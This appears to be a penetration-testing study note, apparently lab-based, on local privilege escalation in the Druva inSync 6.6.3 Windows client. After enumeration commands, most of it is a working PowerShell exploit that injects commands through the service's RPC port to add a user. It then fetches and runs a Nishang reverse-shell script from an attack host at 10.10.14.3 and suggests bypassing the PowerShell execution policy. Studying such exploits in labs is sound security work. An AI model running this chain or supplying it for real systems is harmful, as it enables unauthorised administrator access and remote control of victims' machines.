
## Enumeration

In this example we have `Druva inSync` installed whose `v6.6.3` is vulnerable to a command injection with a exposed RPC service. [Exploit PoC](https://www.exploit-db.com/exploits/49211). [Blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/)

```PowerShell
C:\htb> wmic product get name
### Enumerating Installed Programs

C:\htb> netstat -ano | findstr 6064
### Looking if the service is running on port 6064 (common for druva)

PS C:\htb> Get-NetTCPConnection -LocalPort 6064 | Select-Object LocalPort,OwningProcess
### Looking for PID of process running on port 6064

PS C:\htb> get-process -Id 3324
### Comfirming the PID

PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
### Enumerating running service
```

[CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1.

---

## Druva inSync Windows Client Local Privilege Escalation Example

```PowerShell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add" ### We can edit this according to our need. 

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Now lets connect a reverse shell, download [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) on attack machine and add the following at the end of this file, rename like `shell.ps1`.

```sh
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modify the $cmd variable to install and load our script in memory.

```PowerShell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

Execute the PoC script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`).

---